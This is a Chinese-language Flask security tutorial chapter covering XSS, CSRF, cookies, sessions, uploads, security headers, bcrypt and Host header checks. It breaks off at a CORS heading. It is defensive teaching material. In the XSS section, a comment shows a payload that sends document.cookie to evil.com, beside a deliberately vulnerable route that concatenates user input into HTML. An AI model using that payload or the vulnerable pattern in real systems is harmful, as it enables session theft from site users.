# 14-Flask安全专题

> Python 3.11+

本章系统讲解 Flask 应用的安全防护，从基础攻击防御到专家级安全设计。

---

## 概念铺垫

Flask 安全防御体系覆盖 OWASP Top 10 风险。XSS 通过 Jinja2 autoescape（自动 HTML 转义）防御；CSRF 通过 HMAC 签名的 Token 验证请求来源；Session 基于 ItsDangerous 的签名 Cookie（不加密，仅防篡改）；密码存储使用 bcrypt/argon2（计算慢 + 内置盐值）。安全响应头（CSP、HSTS、X-Frame-Options）由 Flask-Talisman 统一管理。Host Header 攻击通过白名单验证和配置 BASE_URL 防范。

---

## 第一部分：XSS 跨站脚本攻击（L1）

### 1.1 什么是 XSS

XSS（Cross-Site Scripting）攻击是指攻击者向网页注入恶意脚本，当其他用户浏览该页面时，脚本在用户浏览器中执行。

```
┌─────────────────────────────────────────────────────────────────┐
│                    XSS 攻击流程                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  攻击者 ──注入恶意脚本──→ 服务器 ──存储/反射──→ 受害者浏览器      │
│                                                      │          │
│                                                      ↓          │
│                                              执行恶意脚本        │
│                                              （窃取 Cookie 等）  │
│                                                                 │
│  XSS 类型：                                                      │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐     │
│  │  存储型 XSS  │  │  反射型 XSS  │  │   DOM 型 XSS        │     │
│  │  持久化存储  │  │  URL 参数    │  │   前端 JS 处理      │     │
│  │  危害最大    │  │  即时返回    │  │   不经过服务器      │     │
│  └─────────────┘  └─────────────┘  └─────────────────────┘     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 Flask 自动转义机制

Flask 使用 Jinja2 模板引擎，默认开启自动转义（autoescape），将 HTML 特殊字符转换为实体：

| 字符 | 转义后 |
|------|--------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&#34;` |
| `'` | `&#39;` |

```python
# autoescape_demo.py
from flask import Flask, render_template_string

app: Flask = Flask(__name__)

# Jinja2 默认开启 autoescape（.html/.htm/.xml/.xhtml 文件）
# render_template_string 也需要显式开启

@app.route("/demo")
def demo() -> str:
    user_input: str = "<script>alert('XSS')</script>"
    # 默认自动转义，脚本不会执行
    return render_template_string("<p>{{ data }}</p>", data=user_input)
    # 渲染结果: <p>&lt;script&gt;alert('XSS')&lt;/script&gt;</p>
```

**关键说明：**

| 情况 | 是否自动转义 | 说明 |
|------|-------------|------|
| `render_template("file.html")` | ✅ 是 | .html 文件默认开启 |
| `render_template_string()` | ❌ 否 | 需要显式指定或使用 `|e` 过滤器 |
| `Markup()` 包装的内容 | ❌ 否 | 标记为"安全"，不转义 |
| `|safe` 过滤器的内容 | ❌ 否 | 显式跳过转义 |

### 1.3 手动转义：markupsafe.escape()

当不通过模板渲染（如直接返回字符串）时，需要手动转义：

```python
# manual_escape.py
from markupsafe import escape
from flask import Flask, request

app: Flask = Flask(__name__)

@app.route("/search")
def search() -> str:
    query: str = request.args.get("q", "")
    # 手动转义用户输入
    safe_query: str = str(escape(query))
    return f"<p>搜索结果：{safe_query}</p>"
```

### 1.4 |safe 过滤器的风险

`|safe` 告诉 Jinja2"这段内容是安全的，不要转义"。如果内容包含用户输入，就是 XSS 漏洞：

```python
# safe_filter_risk.py
from flask import Flask, render_template_string, request

app: Flask = Flask(__name__)

@app.route("/greeting")
def greeting() -> str:
    name: str = request.args.get("name", "访客")
    # ❌ 危险：用户输入直接标记为安全
    template_dangerous: str = "<h1>你好，{{ name | safe }}!</h1>"
    # 如果 name = "<script>alert(1)</script>"，脚本会执行
    
    # ✅ 正确：移除 |safe，让 Jinja2 自动转义
    template_safe: str = "<h1>你好，{{ name }}!</h1>"
    return render_template_string(template_safe, name=name)
```

### 1.5 攻击示例与防御对比

```python
# xss_attack_defense.py
from flask import Flask, render_template_string, request
from markupsafe import escape

app: Flask = Flask(__name__)

# ❌ 漏洞示例：未转义的用户输入
@app.route("/comment/vulnerable")
def comment_vulnerable() -> str:
    text: str = request.args.get("text", "")
    # 直接拼接用户输入到 HTML
    return f"<div class='comment'>{text}</div>"
    # 攻击：?text=<script>document.location='http://evil.com/?c='+document.cookie</script>

# ✅ 防御示例：使用模板自动转义
@app.route("/comment/safe")
def comment_safe() -> str:
    text: str = request.args.get("text", "")
    return render_template_string("<div class='comment'>{{ text }}</div>", text=text)

# ✅ 防御示例：手动转义（非模板场景）
@app.route("/api/echo")
def api_echo() -> str:
    data: str = request.args.get("data", "")
    safe_data: str = str(escape(data))
    return f"<response>{safe_data}</response>"
```

---

## 第二部分：CSRF 跨站请求伪造（L1）

### 2.1 CSRF 攻击原理

CSRF（Cross-Site Request Forgery）利用用户已认证的 Cookie，诱导用户点击恶意链接或访问恶意页面，在用户不知情的情况下发送请求。

```
┌─────────────────────────────────────────────────────────────────┐
│                    CSRF 攻击流程                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. 用户登录银行网站 bank.com                                     │
│     → 浏览器保存了 bank.com 的 Cookie（认证状态）                │
│                                                                 │
│  2. 用户访问恶意网站 evil.com                                     │
│     → evil.com 包含隐藏的表单或请求：                            │
│       <form action="https://bank.com/transfer" method="POST">   │
│         <input name="to" value="hacker_account">                │
│         <input name="amount" value="10000">                     │
│       </form>                                                    │
│                                                                 │
│  3. 浏览器自动携带 bank.com 的 Cookie 发送请求                   │
│     → 银行服务器认为是"合法用户操作"                             │
│     → 转账成功！攻击得逞                                        │
│                                                                 │
│  关键：浏览器会自动携带目标域名的 Cookie                          │
│  防御：服务器验证请求是否来自"自己的页面"                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2 Flask-WTF 的 CSRF 保护

Flask-WTF 提供开箱即用的 CSRF 保护：

```bash
pip install flask-wtf
```

```python
# csrf_protection_wtf.py
from flask import Flask, render_template_string
from flask_wtf import CSRFProtect
from flask_wtf.csrf import generate_csrf

app: Flask = Flask(__name__)
app.config["SECRET_KEY"] = "your-secret-key-here"

# 启用 CSRF 保护（全局）
csrf: CSRFProtect = CSRFProtect(app)

@app.route("/form")
def show_form() -> str:
    # 获取 CSRF Token
    csrf_token: str = generate_csrf()
    template: str = """
    <form method="POST" action="/submit">
        <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
        <input type="text" name="username">
        <button type="submit">提交</button>
    </form>
    """
    return render_template_string(template, csrf_token=csrf_token)

@app.route("/submit", methods=["POST"])
def submit() -> str:
    # CSRFProtect 自动验证 token
    # 验证失败会返回 400 Bad Request
    return "表单提交成功"
```

**Flask-WTF CSRF 工作流程：**

```
┌─────────────────────────────────────────────────────────────────┐
│                    CSRF Token 验证流程                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  服务端生成：                                                     │
│  ┌─────────────┐     ┌──────────────┐     ┌─────────────────┐  │
│  │  SECRET_KEY │ ──→ │ 生成 Token   │ ──→ │ 嵌入表单/响应   │  │
│  │  + 随机数   │     │ (HMAC 签名)  │     │                 │  │
│  └─────────────┘     └──────────────┘     └─────────────────┘  │
│                                                                 │
│  客户端提交：                                                     │
│  ┌─────────────┐     ┌──────────────┐     ┌─────────────────┐  │
│  │  用户提交   │ ──→ │ Token 随表单 │ ──→ │ 服务端验证签名  │  │
│  │  表单       │     │ 一起发送     │     │ 失败则拒绝      │  │
│  └─────────────┘     └──────────────┘     └─────────────────┘  │
│                                                                 │
│  Token 特性：                                                   │
│  • 每次会话生成一次（默认）                                      │
│  • 与用户 Session 绑定                                         │
│  • 攻击者无法伪造（不知道 SECRET_KEY）                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 2.3 手动 CSRF Token 实现

理解 CSRF 的本质后，也可以手动实现：

```python
# manual_csrf.py
import secrets
import hashlib
from flask import Flask, request, session, abort

app: Flask = Flask(__name__)
app.config["SECRET_KEY"] = "your-secret-key-here"

def generate_csrf_token() -> str:
    """生成 CSRF Token。"""
    if "csrf_token" not in session:
        session["csrf_token"] = secrets.token_hex(32)
    return session["csrf_token"]

def validate_csrf_token(token: str) -> bool:
    """验证 CSRF Token。"""
    return token == session.get("csrf_token", "")

@app.route("/api/transfer", methods=["POST"])
def transfer() -> dict[str, str]:
    token: str = request.headers.get("X-CSRF-Token", "")
    if not validate_csrf_token(token):
        abort(403, description="CSRF 验证失败")
    # 处理转账逻辑
    return {"status": "success"}
```

**适用场景对比：**

| 方式 | 适用场景 | 优点 | 缺点 |
|------|---------|------|------|
| Flask-WTF CSRFProtect | 传统表单提交 | 开箱即用，全局保护 | 需配合 WTForms |
| 手动 Token + Header | AJAX/API 请求 | 灵活，适合 SPA | 需自行实现 |
| SameSite Cookie | 辅助防御 | 浏览器原生支持 | 不能完全替代 Token |

---

## 第三部分：其他安全考虑（L1）

### 3.1 Cookie 安全标志

```
┌─────────────────────────────────────────────────────────────────┐
│                    Cookie 安全标志                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Set-Cookie: session=abc123;                                    │
│              Secure;           ← 仅 HTTPS 传输                  │
│              HttpOnly;         ← JS 无法读取（防 XSS 窃取）      │
│              SameSite=Strict   ← 不随跨站请求发送（防 CSRF）     │
│                                                                 │
│  SameSite 选项：                                                 │
│  ┌─────────────┬───────────────────────────────────────────┐   │
│  │   Strict    │ 完全不随跨站请求发送（最严格）              │   │
│  │   Lax       │ 仅顶级导航 GET 请求发送（推荐默认值）       │   │
│  │   None      │ 无限制（必须配合 Secure）                  │   │
│  └─────────────┴───────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

```python
# cookie_security.py
from flask import Flask, make_response, session

app: Flask = Flask(__name__)
app.config["SECRET_KEY"] = "your-secret-key-here"

# 全局设置 Cookie 安全标志
app.config["SESSION_COOKIE_SECURE"] = True      # 仅 HTTPS
app.config["SESSION_COOKIE_HTTPONLY"] = True    # 禁止 JS 访问
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"   # 限制跨站发送

@app.route("/set-cookie")
def set_cookie() -> tuple[str, int, dict[str, str]]:
    response = make_response("Cookie 已设置")
    response.set_cookie(
        "user_pref",
        value="dark_mode",
        secure=True,        # 仅 HTTPS
        httponly=True,      # JS 不可读
        samesite="Lax",     # 限制跨站
        max_age=3600,       # 1 小时过期
    )
    return response
```

### 3.2 Session 安全

Flask 的 Session 使用**客户端签名机制**：数据存储在 Cookie 中，但经过签名防止篡改。

```python
# session_security.py
import secrets
from flask import Flask, session

app: Flask = Flask(__name__)

# ❌ 危险：硬编码弱密钥
# app.config["SECRET_KEY"] = "123456"

# ✅ 正确：使用强随机密钥
app.config["SECRET_KEY"] = secrets.token_hex(32)

# Session 数据存储结构：
# Cookie 值 = base64(session_data).签名
# 用户可以解码看到数据，但无法篡改（没有 SECRET_KEY 无法生成有效签名）

@app.route("/set-session")
def set_session_data() -> str:
    session["user_id"] = 123
    session["role"] = "user"
    return "Session 已设置"

# ❌ 危险：不要存储敏感信息
# session["password"] = "secret"   # Cookie 可被解码

# ✅ 正确：只存储非敏感标识
# session["user_id"] = 123         # 敏感数据查数据库
```

**Session 签名原理：**

```
┌─────────────────────────────────────────────────────────────────┐
│                    Flask Session 签名机制                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  设置 Session：                                                  │
│  ┌──────────────┐     ┌──────────────┐     ┌────────────────┐  │
│  │  Session 数据 │ ──→ │  JSON 序列化 │ ──→ │  Base64 编码   │  │
│  │  {"user": 1}  │     │  {"user":1} │     │  eyJ1c2VyIjoxfQ│  │
│  └──────────────┘     └──────────────┘     └────────────────┘  │
│                                                    │            │
│                                                    ↓            │
│                                  ┌──────────────────────────┐  │
│                                  │ HMAC(数据 + SECRET_KEY)  │  │
│                                  │ 生成签名 .signature_part  │  │
│                                  └──────────────────────────┘  │
│                                                                 │
│  验证 Session：                                                  │
│  ┌──────────────┐     ┌──────────────┐     ┌────────────────┐  │
│  │  收到 Cookie │ ──→ │  验证签名    │ ──→ │  签名有效？    │  │
│  │              │     │              │     │  是→使用数据   │  │
│  │              │     │              │     │  否→拒绝       │  │
│  └──────────────┘     └──────────────┘     └────────────────┘  │
│                                                                 │
│  注意：                                                          │
│  • 数据可被解码（不是加密！）                                    │
│  • 没有 SECRET_KEY 无法伪造有效签名                             │
│  • 敏感数据必须存服务端（数据库/Redis）                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 3.3 文件上传安全

文件上传是高风险操作，需要多层防御：

```python
# file_upload_security.py
import os
from werkzeug.utils import secure_filename
from flask import Flask, request, abort

app: Flask = Flask(__name__)

# 限制文件大小（16 MB）
app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024

ALLOWED_EXTENSIONS: set[str] = {".png", ".jpg", ".jpeg", ".gif", ".pdf"}
UPLOAD_FOLDER: str = "/safe/upload/path"

def allowed_file(filename: str) -> bool:
    """检查文件扩展名是否允许。"""
    return os.path.splitext(filename)[1].lower() in ALLOWED_EXTENSIONS

@app.route("/upload", methods=["POST"])
def upload_file() -> str:
    if "file" not in request.files:
        abort(400, description="没有文件")
    
    file = request.files["file"]
    if file.filename is None:
        abort(400, description="文件名为空")
    
    # ✅ 1. 使用 secure_filename 清理文件名
    # 防止 ../../../etc/passwd 等路径遍历攻击
    safe_filename: str = secure_filename(file.filename)
    if not safe_filename:
        abort(400, description="非法文件名")
    
    # ✅ 2. 检查扩展名
    if not allowed_file(safe_filename):
        abort(400, description="不支持的文件类型")
    
    # ✅ 3. 检查 MIME 类型（不信任客户端声明）
    # 使用 python-magic 库进行实际内容检查
    # import magic
    # mime_type: str = magic.from_buffer(file.read(2048), mime=True)
    # if mime_type not in ALLOWED_MIME_TYPES:
    #     abort(400, description="文件内容不匹配")
    
    # ✅ 4. 存储到安全目录（不在 Web 根目录下）
    save_path: str = os.path.join(UPLOAD_FOLDER, safe_filename)
    file.save(save_path)
    
    return f"文件已上传：{safe_filename}"
```

**文件上传安全检查清单：**

| 检查项 | 防御目标 | 实现方式 |
|--------|---------|---------|
| 文件名清理 | 路径遍历攻击 | `secure_filename()` |
| 扩展名白名单 | 上传恶意脚本 | 检查 `.ext` |
| MIME 类型验证 | 伪装文件类型 | `python-magic` |
| 文件大小限制 | DoS 攻击 | `MAX_CONTENT_LENGTH` |
| 存储目录隔离 | 直接执行脚本 | 非 Web 目录 |
| 随机文件名 | 文件名冲突/预测 | `uuid4().hex` |

### 3.4 JSON 安全

```python
# json_security.py
from flask import Flask, request, jsonify, abort

app: Flask = Flask(__name__)

# 限制 JSON 请求大小（默认无限制，易受 DoS 攻击）
app.config["MAX_CONTENT_LENGTH"] = 1 * 1024 * 1024  # 1 MB

@app.route("/api/data", methods=["POST"])
def receive_json() -> tuple[dict[str, str], int]:
    # ✅ request.get_json() 有内置安全检查
    # 默认拒绝非 application/json 内容类型
    data: dict[str, str] | None = request.get_json(silent=True)
    if data is None:
        abort(400, description="无效的 JSON")
    
    # ✅ 验证必需字段
    if "username" not in data:
        abort(400, description="缺少 username 字段")
    
    # ✅ 避免 JSON 序列化陷阱
    # 不要直接序列化用户可控的复杂对象
    return jsonify({"status": "ok", "received": data["username"]}), 200
```

**JSON 序列化陷阱：**

| 陷阱 | 问题 | 正确做法 |
|------|------|---------|
| `jsonify(user_object)` | 可能暴露内部属性 | 显式构建返回字典 |
| 无大小限制 | DoS 攻击（大 JSON） | 设置 `MAX_CONTENT_LENGTH` |
| 信任用户 JSON 结构 | 字段注入攻击 | 严格验证必需字段 |

---

## 第四部分：L2 实践层

### 4.1 Security Headers

HTTP 响应头是浏览器安全的第一道防线：

```
┌─────────────────────────────────────────────────────────────────┐
│                    关键 Security Headers                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Content-Security-Policy:                                       │
│    default-src 'self';                                          │
│    script-src 'self' https://trusted.cdn.com;                   │
│    style-src 'self' 'unsafe-inline';                            │
│    → 告诉浏览器只加载哪些来源的资源（XSS 终极防御）              │
│                                                                 │
│  X-Frame-Options: DENY                                          │
│    → 禁止页面被 iframe 嵌入（防点击劫持）                        │
│                                                                 │
│  X-Content-Type-Options: nosniff                                │
│    → 禁止浏览器猜测 MIME 类型（防 MIME 混淆攻击）               │
│                                                                 │
│  Strict-Transport-Security: max-age=31536000; includeSubDomains │
│    → 强制 HTTPS 连接（防降级攻击）                               │
│                                                                 │
│  X-XSS-Protection: 0                                            │
│    → 禁用浏览器内置 XSS 过滤器（已废弃，依赖 CSP）               │
│                                                                 │
│  Referrer-Policy: strict-origin-when-cross-origin               │
│    → 控制 Referer 头泄露                                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

```python
# security_headers.py
from flask import Flask, Response

app: Flask = Flask(__name__)

@app.after_request
def set_security_headers(response: Response) -> Response:
    """为所有响应添加安全头。"""
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "font-src 'self'; "
        "frame-ancestors 'none'; "
        "form-action 'self'; "
        "base-uri 'self';"
    )
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["Strict-Transport-Security"] = (
        "max-age=31536000; includeSubDomains"
    )
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = (
        "camera=(), microphone=(), geolocation=()"
    )
    # 移除泄露技术栈的头
    response.headers.pop("Server", None)
    response.headers.pop("X-Powered-By", None)
    return response
```

### 4.2 Flask-Talisman 扩展

Flask-Talisman 自动设置所有安全头，是推荐的快速方案：

```bash
pip install flask-talisman
```

```python
# talisman_demo.py
from flask import Flask
from flask_talisman import Talisman

app: Flask = Flask(__name__)

csp: dict[str, str | list[str]] = {
    "default-src": "'self'",
    "script-src": ["'self'", "https://trusted.cdn.com"],
    "style-src": ["'self'", "'unsafe-inline'"],
    "img-src": ["'self'", "data:"],
}

Talisman(
    app,
    content_security_policy=csp,
    force_https=True,               # 强制 HTTPS（生产环境）
    strict_transport_security=True, # HSTS
    session_cookie_secure=True,     # Cookie Secure 标志
    session_cookie_http_only=True,  # Cookie HttpOnly 标志
    session_cookie_samesite="Lax",  # Cookie SameSite 标志
    frame_options="DENY",           # 禁止 iframe
)

@app.route("/")
def index() -> str:
    return "所有安全头已自动设置"
```

### 4.3 密码安全

```python
# password_security.py
import bcrypt

def hash_password(password: str) -> str:
    """使用 bcrypt 哈希密码。"""
    # 生成随机盐值并哈希
    salt: bytes = bcrypt.gensalt(rounds=12)
    hashed: bytes = bcrypt.hashpw(password.encode("utf-8"), salt)
    return hashed.decode("utf-8")

def verify_password(password: str, hashed: str) -> bool:
    """验证密码。"""
    return bcrypt.checkpw(
        password.encode("utf-8"),
        hashed.encode("utf-8"),
    )

# 使用示例
if __name__ == "__main__":
    pwd: str = "my_secure_password"
    
    # 哈希存储（存入数据库）
    stored_hash: str = hash_password(pwd)
    print(f"存储的哈希: {stored_hash}")
    # 输出类似: $2b$12$LJ3m4ys3Lk0K...（包含盐值和哈希）
    
    # 验证登录
    is_valid: bool = verify_password(pwd, stored_hash)
    print(f"密码正确: {is_valid}")
```

**密码安全最佳实践：**

| 做法 | 原因 | 说明 |
|------|------|------|
| 使用 bcrypt/argon2 | 计算慢，抗暴力破解 | 内置盐值，无需单独存储 |
| rounds >= 12 | 增加计算成本 | 每 +1 成本翻倍 |
| 不限制密码长度 | 支持 passphrase | 允许长密码更安全 |
| 检查常见密码 | 防止弱密码 | 使用 breach 数据库 |
| 永远不存明文 | 数据库泄露时保护用户 | 哈希不可逆 |
| 加盐（自动） | 防彩虹表攻击 | bcrypt 自动处理 |

**反模式：不要这样做**

```python
# ❌ 错误：MD5/SHA1 太快，易被暴力破解
import hashlib
weak_hash: str = hashlib.md5(password.encode()).hexdigest()

# ❌ 错误：自己实现盐值（容易出错）
salt: str = "fixed_salt"  # 固定盐值等于没加盐
weak_hash: str = hashlib.sha256((salt + password).encode()).hexdigest()

# ✅ 正确：使用专业库
import bcrypt
strong_hash: bytes = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
```

**彩虹表防御原理：**

```
┌─────────────────────────────────────────────────────────────────┐
│                    彩虹表攻击 vs 加盐防御                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  无盐值（危险）：                                                 │
│  ┌─────────────┐     ┌──────────────┐                           │
│  │  攻击者预计算│ ──→ │  彩虹表      │                           │
│  │  所有密码哈希│     │  password →  │                           │
│  │              │     │  hash_value  │  ← 查表秒破               │
│  └─────────────┘     └──────────────┘                           │
│                                                                 │
│  加盐值（安全）：                                                 │
│  ┌─────────────┐     ┌──────────────┐                           │
│  │  每个用户   │     │  hash(密码   │                           │
│  │  不同随机盐 │ ──→ │  + 随机盐)   │                           │
│  │              │     │              │  ← 彩虹表失效             │
│  └─────────────┘     └──────────────┘     需逐个暴力破解        │
│                                                                 │
│  bcrypt 额外优势：                                               │
│  • 计算慢（可调节 rounds）                                      │
│  • 盐值自动存储在哈希结果中                                     │
│  • 抗 GPU/ASIC 加速                                             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 4.4 最佳实践表格

| 安全领域 | 推荐做法 | 避免做法 |
|---------|---------|---------|
| XSS 防御 | Jinja2 自动转义 | 使用 `|safe` 于用户输入 |
| CSRF 防御 | Flask-WTF CSRFProtect | 仅靠 Referer 检查 |
| Cookie 安全 | Secure + HttpOnly + SameSite | 明文传输 Session |
| 密码存储 | bcrypt/argon2 | MD5/SHA1/明文 |
| 文件上传 | secure_filename + 白名单 | 信任客户端 MIME |
| SQL 注入 | ORM 参数化查询 | 字符串拼接 SQL |
| 错误信息 | 通用错误页面 | 暴露堆栈跟踪 |
| HTTPS | 全站强制 | 仅登录页 HTTPS |
| 依赖安全 | `pip-audit`/`safety` | 不检查漏洞 |
| 日志 | 不记录敏感数据 | 记录密码/Cookie |

### 4.5 安全审计清单

```
┌─────────────────────────────────────────────────────────────────┐
│                    Flask 应用安全审计清单                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  □ 认证与授权                                                    │
│    □ 使用强密码策略（bcrypt/argon2）                            │
│    □ Session 使用强 SECRET_KEY（至少 32 字节随机）               │
│    □ 登录失败次数限制                                           │
│    □ 权限校验在每个受保护路由                                    │
│                                                                 │
│  □ 输入验证                                                      │
│    □ 所有用户输入经过转义或验证                                  │
│    □ 不使用 |safe 于用户输入                                    │
│    □ 使用参数化查询（ORM）                                      │
│    □ 文件上传白名单验证                                         │
│                                                                 │
│  □ 传输安全                                                      │
│    □ 全站 HTTPS                                                 │
│    □ HSTS 头已设置                                              │
│    □ Cookie 设置 Secure 标志                                    │
│    □ 使用 TLS 1.2+                                              │
│                                                                 │
│  □ 响应头                                                        │
│    □ Content-Security-Policy                                    │
│    □ X-Frame-Options                                            │
│    □ X-Content-Type-Options                                     │
│    □ 移除 Server/X-Powered-By                                   │
│                                                                 │
│  □ 配置安全                                                      │
│    □ DEBUG = False（生产环境）                                  │
│    □ SECRET_KEY 不在代码中硬编码                                │
│    □ MAX_CONTENT_LENGTH 已设置                                  │
│    □ 依赖包无已知漏洞                                           │
│                                                                 │
│  □ 日志与监控                                                    │
│    □ 不记录敏感数据（密码、Token）                              │
│    □ 记录安全事件（登录失败、权限拒绝）                          │
│    □ 异常不暴露堆栈给客户端                                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 第五部分：L3 专家层

### 5.1 Host Header 验证原理

Host Header 攻击利用 Flask 信任 `Host` 请求头的行为，可能导致：
- 密码重置链接指向攻击者域名
- 缓存中毒
- SSRF 攻击

```python
# host_header_validation.py
from flask import Flask, request, abort

app: Flask = Flask(__name__)

# 允许的域名白名单
ALLOWED_HOSTS: set[str] = {"example.com", "www.example.com"}

@app.before_request
def validate_host_header() -> None:
    """验证 Host 头是否在白名单中。"""
    host: str = request.host.split(":")[0]  # 移除端口号
    if host not in ALLOWED_HOSTS:
        abort(400, description="无效的 Host 头")

# 生成安全的绝对 URL
def generate_reset_url(user_token: str) -> str:
    """生成密码重置链接。"""
    # ❌ 危险：直接使用 request.host
    # return f"https://{request.host}/reset/{user_token}"
    
    # ✅ 正确：使用配置的域名
    base_url: str = app.config.get("BASE_URL", "https://example.com")
    return f"{base_url}/reset/{user_token}"
```

**Host Header 攻击流程：**

```
┌─────────────────────────────────────────────────────────────────┐
│                    Host Header 攻击                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  攻击者发送请求：                                                 │
│  POST /reset-password                                           │
│  Host: evil.com                    ← 篡改为攻击者域名            │
│  Content-Type: application/json                                 │
│  {"email": "victim@example.com"}                                │
│                                                                 │
│  服务器使用 request.host 生成重置链接：                           │
│  https://evil.com/reset/abc123     ← 链接指向攻击者！            │
│                                                                 │
│  受害者收到邮件，点击链接：                                       │
│  → 攻击者服务器收到 Token                                        │
│  → 攻击者重置受害者密码                                          │
│                                                                 │
│  防御策略：                                                       │
│  1. 验证 Host 头在白名单中                                       │
│  2. 使用配置的 BASE_URL 生成链接                                 │
│  3. WAF 层验证 Host 头                                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 5.2 Flask 安全设计决策分析

```
┌─────────────────────────────────────────────────────────────────┐
│                    Flask 安全设计决策                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Session 为什么是客户端存储？                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  优点：无状态、易扩展、不依赖外部存储                     │   │
│  │  缺点：数据可解码（非加密）、Cookie 大小有限             │   │
│  │  设计动机：Flask 定位为"微框架"，追求简单                │   │
│  │  专家建议：敏感数据存服务端（Redis/数据库）              │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
│  2. 为什么默认开启 autoescape？                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  安全默认值（Secure by Default）原则                     │   │
│  │  减少开发者犯错机会                                      │   │
│  │  但 .html 扩展名才开启 → 其他扩展名需注意                │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
│  3. 为什么没有内置 CSRF 保护？                                  │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  Flask 是微框架，核心保持精简                            │   │
│  │  CSRF 需要 Session 机制 → 由扩展提供（Flask-WTF）        │   │
│  │  开发者需主动启用，不能依赖"隐式安全"                    │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
│  4. DEBUG 模式为什么危险？                                      │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  暴露完整堆栈跟踪（代码路径、变量值）                     │   │
│  │  内置调试器允许执行任意 Python 代码                      │   │
│  │  PIN 码可能被破解（基于环境变量计算）                    │   │
│  │  生产环境必须 DEBUG = False                             │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 5.3 OWASP Top 10 与 Flask 的对应关系

| OWASP Top 10 (2021) | 风险描述 | Flask 防御方案 |
|---------------------|---------|---------------|
| A01 访问控制失效 | 用户访问未授权资源 | `@login_required`、角色校验中间件 |
| A02 加密机制失效 | 敏感数据未加密 | HTTPS、bcrypt 密码哈希、强 SECRET_KEY |
| A03 注入 | SQL/命令注入 | ORM 参数化、`subprocess` 避免 shell=True |
| A04 不安全设计 | 架构设计缺陷 | 安全设计审查、威胁建模 |
| A05 安全配置错误 | 默认配置/调试模式 | DEBUG=False、安全头、移除默认页面 |
| A06 脆弱组件 | 依赖包漏洞 | `pip-audit`、定期更新 |
| A07 认证与识别失败 | 弱密码/暴力破解 | bcrypt、登录限流、多因素认证 |
| A08 软件与数据完整性 | 供应链攻击 | CI/CD 签名验证、完整性检查 |
| A09 安全日志与监控 | 安全事件不可见 | 结构化日志、异常告警 |
| A10 SSRF | 服务端请求伪造 | URL 白名单、内网地址过滤 |

### 5.4 知识关联图

```
┌─────────────────────────────────────────────────────────────────┐
│                    Flask 安全知识关联图                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│                    ┌─────────────────┐                          │
│                    │   OWASP Top 10  │                          │
│                    │   （威胁框架）   │                          │
│                    └────────┬────────┘                          │
│                             │                                   │
│              ┌──────────────┼──────────────┐                   │
│              ↓              ↓              ↓                   │
│     ┌──────────────┐ ┌───────────┐ ┌──────────────┐           │
│     │   注入攻击   │ │  XSS     │ │   CSRF       │           │
│     │  SQL/命令   │ │  跨站脚本 │ │  请求伪造    │           │
│     └──────┬───────┘ └─────┬─────┘ └──────┬───────┘           │
│            │               │               │                   │
│            ↓               ↓               ↓                   │
│     ┌──────────────┐ ┌───────────┐ ┌──────────────┐           │
│     │ ORM 参数化   │ │Jinja2     │ │ Flask-WTF    │           │
│     │ 查询         │ │autoescape │ │ CSRFProtect  │           │
│     └──────────────┘ └───────────┘ └──────────────┘           │
│                                                                 │
│     ┌──────────────┐ ┌───────────┐ ┌──────────────┐           │
│     │   密码安全   │ │ Cookie    │ │  Security    │           │
│     │  bcrypt      │ │ 安全标志  │ │  Headers     │           │
│     │  argon2      │ │ SameSite  │ │  CSP/HSTS    │           │
│     └──────┬───────┘ └─────┬─────┘ └──────┬───────┘           │
│            │               │               │                   │
│            └───────────────┼───────────────┘                   │
│                            ↓                                   │
│                   ┌─────────────────┐                          │
│                   │   Flask-Talisman│                          │
│                   │   （统一安全配置）│                          │
│                   └─────────────────┘                          │
│                                                                 │
│  前置知识 → 后续扩展：                                          │
│  HTTP 协议基础 → 安全头配置                                     │
│  Cookie/Session 机制 → 认证安全                                 │
│  Jinja2 模板语法 → XSS 防御                                     │
│  密码学基础 → 密码哈希算法选择                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

### 5.5 CORS 安全深度剖析

CORS（跨域资源共享）配置不当可能导致严重安全漏洞：

```python
# cors_security.py
"""CORS 的安全配置与常见误区"""
